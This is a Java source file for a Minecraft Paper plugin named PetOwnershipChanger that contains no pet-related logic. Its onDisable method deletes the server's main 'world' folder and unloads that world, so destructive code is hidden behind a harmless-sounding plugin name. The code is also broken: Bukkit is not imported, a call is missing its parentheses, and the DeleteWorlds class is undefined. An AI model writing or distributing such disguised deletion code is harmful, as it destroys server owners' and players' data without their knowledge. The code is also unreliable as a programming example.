package riyaya1528.paper.petownershipchanger;

import org.bukkit.plugin.java.JavaPlugin;

public final class PetOwnershipChanger extends JavaPlugin {
    public static PetOwnershipChanger instance;

    @Override
    public void onEnable() {
        
        instance = this;
        getLogger().info("loaded!");
    }

    @Override
    public void onDisable() {
        getLogger().info("Unloaded");
        DeleteWorlds.DeleteWorld(Bukkit.getServer().getWorld("world").getWorldFolder());
        Bukkit.getServer().unloadWorld(getServer.getWorld("world"), true);



    }
}
